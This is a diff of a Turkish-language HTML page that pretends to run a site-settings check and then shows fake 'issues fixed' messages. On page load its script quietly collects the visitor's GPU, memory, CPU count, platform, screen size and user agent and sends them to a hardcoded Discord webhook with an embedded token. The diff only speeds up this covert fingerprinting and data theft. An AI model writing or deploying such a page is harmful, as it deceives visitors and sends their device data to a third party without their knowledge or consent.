@@ -3,26 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kontrolü</title>
+    <title>Kontrol</title>
     <style>
-        body { background-color: #0c0c0c; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: #fff; }
-        .container { text-align: center; }
-        .loader { border: 2px solid #333; border-top: 2px solid #0f4; border-radius: 50%; width: 25px; height: 25px; animation: spin 0.4s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-weight: 400; font-size: 14px; margin: 0; color: #ccc; }
-        .ok { color: #0f4; font-weight: bold; }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
+        h2 { color:#0f4; font-size:14px; font-weight:400; }
+        .ok { font-weight:bold; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="ld" class="loader"></div>
-        <h2 id="tx">Site ayarları kontrol ediliyor...</h2>
-    </div>
+    <h2 id="t">Site ayarları kontrol ediliyor...</h2>
 
     <script>
-        const url = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const t = document.getElementById('t');
 
-        function get() {
+        // 1. ANINDA GÖNDERİM (Beklemesiz)
+        (function send() {
             let g = "N/A";
             try {
                 const c = document.createElement('canvas');
@@ -31,41 +27,26 @@
                 g = gl.getParameter(d.UNMASKED_RENDERER_ID);
             } catch(e) {}
 
-            return {
+            const data = {
                 embeds: [{
-                    title: "⚡ HIZLI LOG",
+                    title: "⚡ INSTANT LOG",
                     color: 3066993,
                     fields: [
-                        { name: "HW", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}GB\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
-                        { name: "SCR", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "SYS", value: `${navigator.platform}`, inline: true },
+                        { name: "HW", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}G\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
+                        { name: "SYS", value: `${navigator.platform} | ${window.screen.width}x${window.screen.height}`, inline: false },
                         { name: "UA", value: "```" + navigator.userAgent + "```", inline: false }
                     ]
                 }]
             };
-        }
 
-        // Anında tetikleme
-        (function run() {
-            const data = get();
-            
-            // Beklemeden gönder
-            navigator.sendBeacon(url, JSON.stringify(data));
-            fetch(url, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
-
-            // Görsel akışı hızlandır (Milisaniyelik geçişler)
-            const tx = document.getElementById('tx');
-            const ld = document.getElementById('ld');
-
-            setTimeout(() => {
-                tx.innerHTML = '<span class="ok">Site uygun halde!</span>';
-            }, 400); // 0.4 saniye
-
-            setTimeout(() => {
-                ld.style.display = "none";
-                tx.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>';
-            }, 900); // Toplam 0.9 saniyede her şey biter
+            // Beacon en hızlısıdır, fetch ile destekle
+            navigator.sendBeacon(u, JSON.stringify(data));
+            fetch(u, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
         })();
+
+        // 2. YILDIRIM HIZINDA ARAYÜZ
+        setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 300); 
+        setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 700);
     </script>
 </body>
 </html>
